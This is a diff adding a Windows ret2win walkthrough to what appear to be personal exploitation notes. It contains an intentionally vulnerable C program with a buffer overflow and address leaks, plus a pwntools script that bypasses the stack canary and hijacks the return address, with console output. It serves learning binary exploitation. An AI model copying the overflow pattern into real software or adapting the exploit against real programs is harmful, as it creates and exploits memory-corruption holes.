@@ -1945,3 +1945,184 @@ io.interactive()
 
 
 
+
+<br>
+
+
+<br>
+
+
+# a little look at windows pwn (ret2win)
+
+
+```c
+#include <stdio.h>
+#include <windows.h>
+#include <stdint.h>
+
+
+void win() {
+	printf("you win!!\n");
+}
+
+int main() {
+
+	//HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+	//printf("LEAK: %p\n", kernel32);
+	//printf("LEAK: %p\n", WinExec);
+	printf("WIN ADDR: %p\n", win);
+
+
+
+
+	char name[32] = {0};
+	//char name[32] = "aaaaaaaabbbbbbbbccccccccdddddddd";
+
+	printf("%I64x\n", *((uint64_t *) name+4));
+	printf("%I64x\n", *((uint64_t *) name+5));
+	printf("%I64x\n", *((uint64_t *) name+6));
+	printf("%I64x\n", *((uint64_t *) name+7));
+	printf("%I64x\n", *((uint64_t *) name+8));
+	printf("%I64x\n", *((uint64_t *) name+9));
+
+
+	printf("what is your name? ");
+	fflush(stdout);
+	read(0, &name, 200);
+	
+
+	printf("hello %s\n", name);
+
+	//WinExec("calc", 1);
+
+	printf("rbp+8 : %I64x\n", *((uint64_t *) name+9));
+	printf("rbp   : %I64x\n", *((uint64_t *) name+8));
+	printf("rbp-8 : %I64x\n", *((uint64_t *) name+7));
+	printf("rbp-16: %I64x\n", *((uint64_t *) name+6));
+	printf("rbp-24: %I64x\n", *((uint64_t *) name+5));
+	printf("rbp-32: %I64x\n", *((uint64_t *) name+4));
+	printf("rbp-40: %I64x\n", *((uint64_t *) name+3));
+	printf("rbp-48: %I64x\n", *((uint64_t *) name+2));
+	printf("rbp-56: %I64x\n", *((uint64_t *) name+1));
+	printf("rbp-64: %I64x\n", *((uint64_t *) name));
+}
+```
+
+
+<br>
+
+I compiled it inside "x64 native tools command prompt for vs"
+
+```
+C:\Users\connor\Desktop>cl x.c & x
+Microsoft (R) C/C++ Optimizing Compiler Version 19.51.36260 for x64
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+x.c
+Microsoft (R) Incremental Linker Version 14.51.36260.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+/out:x.exe
+x.obj
+WIN ADDR: 00007FF7E5A01000
+4449512ffee0
+7ff7e5a172d8
+19c8a251310
+7ff7e5a016bf
+0
+7ff7e5a01739
+what is your name? test
+hello test
+
+
+rbp+8 : 7ff7e5a01739
+rbp   : 0
+rbp-8 : 7ff7e5a016bf
+rbp-16: 19c8a251310
+rbp-24: 7ff7e5a172d8
+rbp-32: 4449512ffee0
+rbp-40: 0
+rbp-48: 0
+rbp-56: 0
+rbp-64: a0a74736574
+
+C:\Users\connor\Desktop>
+```
+
+
+<br>
+
+<br>
+
+```python
+from pwn import *
+
+p = process('./x.exe')
+win = int(p.recvline().split()[-1], 16)
+s4 = int(p.recvline().split()[-1], 16)
+s5 = int(p.recvline().split()[-1], 16)
+s6 = int(p.recvline().split()[-1], 16)
+s7 = int(p.recvline().split()[-1], 16)
+s8 = int(p.recvline().split()[-1], 16)
+s9 = int(p.recvline().split()[-1], 16)
+print(f'{win:x}')
+print(f'{s4:x}')
+print(f'{s5:x}')
+print(f'{s6:x}')
+print(f'{s7:x}')
+print(f'{s8:x}')
+print(f'{s9:x}')
+print(p.recv())
+CANARY = s4
+RET_gadget = win+0x15 # just for stack alignment
+p.send( b'AAAAAAAA'*4 + p64(CANARY) + b'BBBBBBBB' + b'oldrbpxx' + p64(RET_gadget) + p64(win) )
+p.interactive()
+
+```
+
+
+
+<br>
+
+```
+PS C:\Users\connor\Desktop> python .\x.py
+[x] Starting local process './x.exe'
+[+] Starting local process './x.exe': pid 18180
+7ff7e5a01000
+9e7f36ba7890
+7ff7e5a172d8
+15f1f62a650
+7ff7e5a016bf
+0
+7ff7e5a01739
+b'what is your name? '
+[*] Switching to interactive mode
+hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�x�6⌂�
+rbp+8 : 7ff7e5a01739
+rbp   : 7ff7e5a01000
+rbp-8 : 7ff7e5a01015
+rbp-16: 7878706272646c6f
+rbp-24: 4242424242424242
+rbp-32: 9e7f36ba7890
+rbp-40: 4141414141414141
+rbp-48: 4141414141414141
+rbp-56: 4141414141414141
+rbp-64: 4141414141414141
+you win!!
+WIN ADDR: 00007FF7E5A01000
+9e7f36ba7890
+7ff7e5a22218
+15f1f62a650
+7ff7e5a016bf
+7ff7e5a01000
+7ff7e5a01739
+what is your name?
+```
+
+
+<br>
+
+<br>
+
+
+---
